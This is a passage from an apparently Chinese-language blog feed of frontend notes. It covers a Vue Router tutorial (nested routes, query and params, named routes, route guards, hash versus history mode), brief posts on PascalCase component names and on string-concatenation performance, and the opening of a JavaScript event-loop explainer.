active-class&#x3D;&quot;active&quot; to&#x3D;&quot;&#x2F;about&quot;&gt;About&lt;&#x2F;router-link&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>指定展示位置</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;router-view&gt;&lt;&#x2F;router-view&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="2-几个注意点"><a href="#2-几个注意点" class="headerlink" title="2.几个注意点"></a>2.几个注意点</h3><ol><li>路由组件通常存放在<code>pages</code>文件夹，一般组件通常存放在<code>components</code>文件夹。</li><li>通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。</li><li>每个组件都有自己的<code>$route</code>属性，里面存储着自己的路由信息。</li><li>整个应用只有一个 router，可以通过组件的<code>$router</code>属性获取到。</li></ol><h3 id="3-多级路由（多级路由）"><a href="#3-多级路由（多级路由）" class="headerlink" title="3.多级路由（多级路由）"></a>3.多级路由（多级路由）</h3><ol><li><p>配置路由规则，使用 children 配置项：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">routes</span><span class="token operator">:</span> <span class="token punctuation">[</span>  <span class="token punctuation">&#123;</span>    <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">'/about'</span><span class="token punctuation">,</span>    <span class="token literal-property property">component</span><span class="token operator">:</span> About<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span>    <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">'/home'</span><span class="token punctuation">,</span>    <span class="token literal-property property">component</span><span class="token operator">:</span> Home<span class="token punctuation">,</span>    <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>      <span class="token comment">//通过children配置子级路由</span>      <span class="token punctuation">&#123;</span>        <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">'news'</span><span class="token punctuation">,</span> <span class="token comment">//此处一定不要写：/news</span>        <span class="token literal-property property">component</span><span class="token operator">:</span> News<span class="token punctuation">,</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token punctuation">&#123;</span>        <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token comment">//此处一定不要写：/message</span>        <span class="token literal-property property">component</span><span class="token operator">:</span> Message<span class="token punctuation">,</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>跳转（要写完整路径）：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;router-link to&#x3D;&quot;&#x2F;home&#x2F;news&quot;&gt;News&lt;&#x2F;router-link&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="4-路由的-query-参数"><a href="#4-路由的-query-参数" class="headerlink" title="4.路由的 query 参数"></a>4.路由的 query 参数</h3><ol><li><p>传递参数</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!-- 跳转并携带query参数，to的字符串写法 --&gt;&lt;router-link :to&#x3D;&quot;&#x2F;home&#x2F;message&#x2F;detail?id&#x3D;666&amp;title&#x3D;你好&quot;&gt;跳转&lt;&#x2F;router-link&gt;&lt;!-- 跳转并携带query参数，to的对象写法 --&gt;&lt;router-link  :to&#x3D;&quot;&#123;    path: &#39;&#x2F;home&#x2F;message&#x2F;detail&#39;,    query: &#123;      id: 666,      title: &#39;你好&#39;,    &#125;,  &#125;&quot;&gt;跳转&lt;&#x2F;router-link&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>接收参数：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">$route<span class="token punctuation">.</span>query<span class="token punctuation">.</span>id<span class="token punctuation">;</span>$route<span class="token punctuation">.</span>query<span class="token punctuation">.</span>title<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h3 id="5-命名路由"><a href="#5-命名路由" class="headerlink" title="5.命名路由"></a>5.命名路由</h3><ol><li><p>作用：可以简化路由的跳转。</p></li><li><p>如何使用</p><ol><li><p>给路由命名：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>   <span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'/demo'</span><span class="token punctuation">,</span>   <span class="token literal-property property">component</span><span class="token operator">:</span>Demo<span class="token punctuation">,</span>   <span class="token literal-property property">children</span><span class="token operator">:</span><span class="token punctuation">[</span>      <span class="token punctuation">&#123;</span>         <span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'test'</span><span class="token punctuation">,</span>         <span class="token literal-property property">component</span><span class="token operator">:</span>Test<span class="token punctuation">,</span>         <span class="token literal-property property">children</span><span class="token operator">:</span><span class="token punctuation">[</span>            <span class="token punctuation">&#123;</span>                      <span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'hello'</span> <span class="token comment">//给路由命名</span>               <span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'welcome'</span><span class="token punctuation">,</span>               <span class="token literal-property property">component</span><span class="token operator">:</span>Hello<span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span>         <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>简化跳转：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!--简化前，需要写完整的路径 --&gt;&lt;router-link to&#x3D;&quot;&#x2F;demo&#x2F;test&#x2F;welcome&quot;&gt;跳转&lt;&#x2F;router-link&gt;&lt;!--简化后，直接通过名字跳转 --&gt;&lt;router-link :to&#x3D;&quot;&#123; name: &#39;hello&#39; &#125;&quot;&gt;跳转&lt;&#x2F;router-link&gt;&lt;!--简化写法配合传递参数 --&gt;&lt;router-link  :to&#x3D;&quot;&#123;    name: &#39;hello&#39;,    query: &#123;      id: 666,      title: &#39;你好&#39;,    &#125;,  &#125;&quot;&gt;跳转&lt;&#x2F;router-link&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol></li></ol><h3 id="6-路由的-params-参数"><a href="#6-路由的-params-参数" class="headerlink" title="6.路由的 params 参数"></a>6.路由的 params 参数</h3><ol><li><p>配置路由，声明接收 params 参数</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>   <span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'/home'</span><span class="token punctuation">,</span>   <span class="token literal-property property">component</span><span class="token operator">:</span>Home<span class="token punctuation">,</span>   <span class="token literal-property property">children</span><span class="token operator">:</span><span class="token punctuation">[</span>      <span class="token punctuation">&#123;</span>         <span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'news'</span><span class="token punctuation">,</span>         <span class="token literal-property property">component</span><span class="token operator">:</span>News      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token punctuation">&#123;</span>         <span class="token literal-property property">component</span><span class="token operator">:</span>Message<span class="token punctuation">,</span>         <span class="token literal-property property">children</span><span class="token operator">:</span><span class="token punctuation">[</span>            <span class="token punctuation">&#123;</span>               <span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'xiangqing'</span><span class="token punctuation">,</span>               <span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'detail/:id/:title'</span><span class="token punctuation">,</span> <span class="token comment">//使用占位符声明接收params参数</span>               <span class="token literal-property property">component</span><span class="token operator">:</span>Detail            <span class="token punctuation">&#125;</span>         <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 指定可选param：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>    <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">'path/:id?'</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>传递参数</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!-- 跳转并携带params参数，to的字符串写法 --&gt;&lt;router-link :to&#x3D;&quot;&#x2F;home&#x2F;message&#x2F;detail&#x2F;666&#x2F;你好&quot;&gt;跳转&lt;&#x2F;router-link&gt;&lt;!-- 跳转并携带params参数，to的对象写法 --&gt;&lt;router-link  :to&#x3D;&quot;&#123;    name: &#39;xiangqing&#39;,    params: &#123;      id: 666,      title: &#39;你好&#39;,    &#125;,  &#125;&quot;&gt;跳转&lt;&#x2F;router-link&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>特别注意：路由携带 params 参数时，若使用 to 的对象写法，则不能使用 path 配置项，必须使用 name 配置！</p></blockquote></li><li><p>接收参数：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">$route<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">;</span>$route<span class="token punctuation">.</span>params<span class="token punctuation">.</span>title<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h3 id="7-路由的-props-配置"><a href="#7-路由的-props-配置" class="headerlink" title="7.路由的 props 配置"></a>7.路由的 props 配置</h3><p>作用：让路由组件更方便的收到参数</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>   <span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'xiangqing'</span><span class="token punctuation">,</span>   <span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'detail/:id'</span><span class="token punctuation">,</span>   <span class="token literal-property property">component</span><span class="token operator">:</span>Detail<span class="token punctuation">,</span>   <span class="token comment">//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件</span>   <span class="token comment">// props:&#123;a:900&#125;</span>   <span class="token comment">//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件</span>   <span class="token comment">// props:true</span>   <span class="token comment">//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件</span>   <span class="token function">props</span><span class="token punctuation">(</span><span class="token parameter">route</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>         <span class="token literal-property property">id</span><span class="token operator">:</span>route<span class="token punctuation">.</span>query<span class="token punctuation">.</span>id<span class="token punctuation">,</span>         <span class="token literal-property property">title</span><span class="token operator">:</span>route<span class="token punctuation">.</span>query<span class="token punctuation">.</span>title      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="8-lt-router-link-gt-的-replace-属性"><a href="#8-lt-router-link-gt-的-replace-属性" class="headerlink" title="8.&lt;router-link&gt;的 replace 属性"></a>8.<code>&lt;router-link&gt;</code>的 replace 属性</h3><ol><li>作用：控制路由跳转时操作浏览器历史记录的模式</li><li>浏览器的历史记录有两种写入方式：分别为<code>push</code>和<code>replace</code>，<code>push</code>是追加历史记录，<code>replace</code>是替换当前记录。路由跳转时候默认为<code>push</code></li><li>如何开启<code>replace</code>模式：<code>&lt;router-link replace .......&gt;News&lt;/router-link&gt;</code></li></ol><h3 id="9-编程式路由导航"><a href="#9-编程式路由导航" class="headerlink" title="9.编程式路由导航"></a>9.编程式路由导航</h3><ol><li><p>作用：不借助<code>&lt;router-link&gt; </code>实现路由跳转，让路由跳转更加灵活</p></li><li><p>具体编码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//$router的两个API</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'xiangqing'</span><span class="token punctuation">,</span>  <span class="token literal-property property">params</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">id</span><span class="token operator">:</span> xxx<span class="token punctuation">,</span>    <span class="token literal-property property">title</span><span class="token operator">:</span> xxx<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'xiangqing'</span><span class="token punctuation">,</span>  <span class="token literal-property property">params</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">id</span><span class="token operator">:</span> xxx<span class="token punctuation">,</span>    <span class="token literal-property property">title</span><span class="token operator">:</span> xxx<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//前进</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后退</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">go</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//可前进也可后退</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="10-缓存路由组件"><a href="#10-缓存路由组件" class="headerlink" title="10.缓存路由组件"></a>10.缓存路由组件</h3><ol><li><p>作用：让不展示的路由组件保持挂载，不被销毁。</p></li><li><p>具体编码：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;keep-alive include&#x3D;&quot;News&quot;&gt;     &lt;router-view&gt;&lt;&#x2F;router-view&gt;&lt;&#x2F;keep-alive&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="11-两个新的生命周期钩子"><a href="#11-两个新的生命周期钩子" class="headerlink" title="11.两个新的生命周期钩子"></a>11.两个新的生命周期钩子</h3><ol><li>作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。</li><li>具体名字：<ol><li><code>activated</code>路由组件被激活时触发。</li><li><code>deactivated</code>路由组件失活时触发。</li></ol></li></ol><h3 id="12-路由守卫"><a href="#12-路由守卫" class="headerlink" title="12.路由守卫"></a>12.路由守卫</h3><ol><li><p>作用：对路由进行权限控制</p></li><li><p>分类：全局守卫、独享守卫、组件内守卫</p></li><li><p>全局守卫:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//全局前置守卫：初始化时执行、每次路由切换前执行</span>router<span class="token punctuation">.</span><span class="token function">beforeEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">to<span class="token punctuation">,</span> from<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'beforeEach'</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> from<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>to<span class="token punctuation">.</span>meta<span class="token punctuation">.</span>isAuth<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//判断当前路由是否需要进行权限控制</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'school'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'wujiu'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">//权限控制的具体规则</span>      <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//放行</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'暂无权限查看'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// next(&#123;name:'guanyu'&#125;)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//放行</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//全局后置守卫：初始化时执行、每次路由切换后执行</span>router<span class="token punctuation">.</span><span class="token function">afterEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">to<span class="token punctuation">,</span> <span class="token keyword">from</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'afterEach'</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> from<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>to<span class="token punctuation">.</span>meta<span class="token punctuation">.</span>title<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    document<span class="token punctuation">.</span>title <span class="token operator">=</span> to<span class="token punctuation">.</span>meta<span class="token punctuation">.</span>title<span class="token punctuation">;</span> <span class="token comment">//修改网页的title</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    document<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">'vue_test'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>独享守卫:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">beforeEnter</span><span class="token punctuation">(</span><span class="token parameter">to<span class="token punctuation">,</span>from<span class="token punctuation">,</span>next</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'beforeEnter'</span><span class="token punctuation">,</span>to<span class="token punctuation">,</span>from<span class="token punctuation">)</span>   <span class="token keyword">if</span><span class="token punctuation">(</span>to<span class="token punctuation">.</span>meta<span class="token punctuation">.</span>isAuth<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//判断当前路由是否需要进行权限控制</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'school'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'wujiu'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>         <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'暂无权限查看'</span><span class="token punctuation">)</span>         <span class="token comment">// next(&#123;name:'guanyu'&#125;)</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>      <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>组件内守卫：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//进入守卫：通过路由规则，进入该组件时被调用</span><span class="token function">beforeRouteEnter</span> <span class="token punctuation">(</span><span class="token parameter">to<span class="token punctuation">,</span> from<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token comment">//离开守卫：通过路由规则，离开该组件时被调用</span><span class="token function">beforeRouteLeave</span> <span class="token punctuation">(</span><span class="token parameter">to<span class="token punctuation">,</span> from<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="13-路由器的两种工作模式"><a href="#13-路由器的两种工作模式" class="headerlink" title="13.路由器的两种工作模式"></a>13.路由器的两种工作模式</h3><p><code>mode: hash</code> <code>mode: history</code></p><ol><li>对于一个 url 来说，什么是 hash 值？—— #及其后面的内容就是 hash 值。</li><li>hash 值不会包含在 HTTP 请求中，即：hash 值不会带给服务器。</li><li>hash 模式：<ol><li>地址中永远带着#号，不美观 。</li><li>若以后将地址通过第三方手机 app 分享，若 app 校验严格，则地址会被标记为不合法。</li><li>兼容性较好。</li></ol></li><li>history 模式：<ol><li>地址干净，美观 。</li><li>兼容性和 hash 模式相比略差。</li><li>应用部署上线时需要后端人员支持，解决刷新页面服务端 404 的问题。</li></ol></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>为什么在vue中的组件使用大驼峰命名时，只能使用脚手架才可以正常解析</title>
      <link href="/2023/04/10/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%9C%A8vue%E4%B8%AD%E7%9A%84%E7%BB%84%E4%BB%B6%E4%BD%BF%E7%94%A8%E5%A4%A7%E9%A9%BC%E5%B3%B0%E5%91%BD%E5%90%8D%E6%97%B6%EF%BC%8C%E5%8F%AA%E8%83%BD%E4%BD%BF%E7%94%A8%E8%84%9A%E6%89%8B%E6%9E%B6%E6%89%8D%E5%8F%AF%E4%BB%A5%E6%AD%A3%E5%B8%B8%E8%A7%A3%E6%9E%90/"/>
      <url>/2023/04/10/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%9C%A8vue%E4%B8%AD%E7%9A%84%E7%BB%84%E4%BB%B6%E4%BD%BF%E7%94%A8%E5%A4%A7%E9%A9%BC%E5%B3%B0%E5%91%BD%E5%90%8D%E6%97%B6%EF%BC%8C%E5%8F%AA%E8%83%BD%E4%BD%BF%E7%94%A8%E8%84%9A%E6%89%8B%E6%9E%B6%E6%89%8D%E5%8F%AF%E4%BB%A5%E6%AD%A3%E5%B8%B8%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>在Vue中，组件的标签名和组件的文件名需要保持一致。而在HTML中，标签名应该采用小写的形式。因此，如果我们使用大驼峰命名法来命名组件，则在HTML中使用该组件时需要使用大写字母开头的标签名，这与HTML的规范不符。</p><p>解决这个问题，Vue脚手架使用了一个工具，即vue-template-compiler，可以在编译时将组件标签名转换为小写形式，从而避免了该问题。因此，如果我们使用脚手架来开发Vue应用，则可以使用大驼峰命名法来命名组件，而不必担心标签名大小写的问题。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>js中处理数组遍历和字符串拼接的几种方法比较</title>
      <link href="/2023/03/29/js%E4%B8%AD%E5%A4%84%E7%90%86%E6%95%B0%E7%BB%84%E9%81%8D%E5%8E%86%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%E6%AF%94%E8%BE%83/"/>
      <url>/2023/03/29/js%E4%B8%AD%E5%A4%84%E7%90%86%E6%95%B0%E7%BB%84%E9%81%8D%E5%8E%86%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%E6%AF%94%E8%BE%83/</url>
      
        <content type="html"><![CDATA[<p>对于数组的遍历和字符串的拼接操作，不同的实现方式确实会对性能产生影响，但这种影响通常是微小的，难以在短时间内对用户产生明显的感知差异。所以在实际的开发过程中，我们更需要考虑代码的可读性和维护性。</p><p>下面简单介绍一下每种实现方式的性能特点：</p><ol><li><p>使用 for 循环和 +&#x3D; 操作符</p><p>这种方式最直接，也最容易理解，但在重复遍历添加字符串片段的过程中，每次都需要重新创建新的字符串，这会不断产生性能瓶颈，尤其在需要处理大量字符串片段的情况下，对内存和 CPU 的消耗都会比较大。</p></li><li><p>使用数组的 join 方法</p><p>使用 join 方法比起直接使用 +&#x3D; 操作符的方式，避免了每次循环都创建新的字符串，这会减缓内存的消耗，但通过 join 方法连接数组元素时，每次遍历后的结果先存在于一个数组中，最后再通过 join 方法组合，这样会对内存占用造成一定的压力，并且如果要处理的数组元素数量过多时，join 方法在连接过程中也会产生性能问题。</p></li><li><p>使用 reduce 方法</p><p>使用 reduce 方法可以避免数组元素先存在于一个数组中的开销，将连接数组元素的操作直接依赖于上一次的计算结果，这样能更高效地处理数组元素，但是 reduce 方法本身也需要在每次遍历时不断地维护一个累积值，这会对 CPU 的性能产生一定的影响。但总体来说，在数组元素过多时，使用 reduce 方法的性能优于使用 join 方法，也要比直接使用 +&#x3D; 操作符的方式快很多。</p></li></ol><p>综上所述，针对不同的需求场景和程序复杂度，可以选择不同的实现方式。在日常开发中，我们更应该注重代码的可读性与维护性，而对于性能问题的解决，应该在实际运行中注意不断优化，而不是一开始就陷入过度优化的状态。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>关于事件循环</title>
      <link href="/2023/03/23/%E5%85%B3%E4%BA%8E%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/"/>
      <url>/2023/03/23/%E5%85%B3%E4%BA%8E%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="如何理解js的异步"><a href="#如何理解js的异步" class="headerlink" title="如何理解js的异步"></a>如何理解js的异步</h2><blockquote><p>js是一门单线程的语言，这是因为它运行在浏览器的渲染主线程中，而渲染主线程只有一个。</p><p>渲染主线程承担着诸多的工作：渲染页面，执行js等都在其中运行。</p><p>而如果使用同步的方式，就极有可能导致主线程产生阻塞，从而导致消息队列中的很多其他任务无法得到执行。这样一来，一方面会导致繁忙的主线程白白的消耗时间，另一方面导致页面无法及时更新，给用户造成卡死的现象</p><p>所以浏览器采用异步的方式来避免。具体做法是当某些任务发生时，比如计时器，网络，事件监听，主线程将任务交给其他线程去处理，自身立即结束任务的执行，转而执行后续代码。当其他线程完成时，将事先传递的回调函数包装成任务，加入消息队列的末尾排队，等待主线程调度执行。</p><p>在这种异步模式下，浏览器永不阻塞，从而最大限度地保证了单线程的流畅运行。</p></blockquote><h2 id="浏览器进程模型"><a href="#浏览器进程模型" class="headerlink" title="浏览器进程模型"></a>浏览器进程模型</h2><p>最主要的进程：</p><ul><li><p>浏览器进程</p><p>主要负责界面显示、用户交互、子进程管理。浏览器进程内部会启动多个线程处理不同的任务</p></li><li><p>网络进程</p><p>负责加载网络资源。网络进程内部会启动多个线程来处理不同的网络任务</p></li><li><p>渲染进程</p><p>渲染进程启动后，会开启一个渲染主线程，负责执行html、css、js代码。<br>默认情况下，浏览器会为每个浏览器页开启一个新的渲染线程，以保证不同的标签页之间互不影响</p></li></ul><h2 id="渲染主线程"><a href="#渲染主线程" class="headerlink" 